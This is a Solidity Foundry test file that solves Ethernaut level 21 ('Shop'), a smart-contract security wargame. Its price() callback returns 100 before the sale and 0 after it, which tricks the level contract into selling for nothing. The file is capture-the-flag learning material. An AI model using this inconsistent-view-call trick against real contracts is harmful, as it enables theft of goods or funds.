// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "test/Ethernaut.t.sol";

interface Level21 {
    function buy() external;
    function isSold() external view returns (bool);
}

contract Level21Test is EthernautTest {
    Level21 level21Instance;

    function testLevel21() public {
        _createLevel("21");

        level21Instance = Level21(levelInstance["21"]);

        // Initiate the buy
        level21Instance.buy();

        require(_submitLevel("21"));
    }

    function price() external view returns (uint256) {
        // Sets the price to zero after the first sale
        if (level21Instance.isSold()) {
            return 0;
        } else {
            // Returns the expected price before the first sale
            return 100;
        }
    }
}
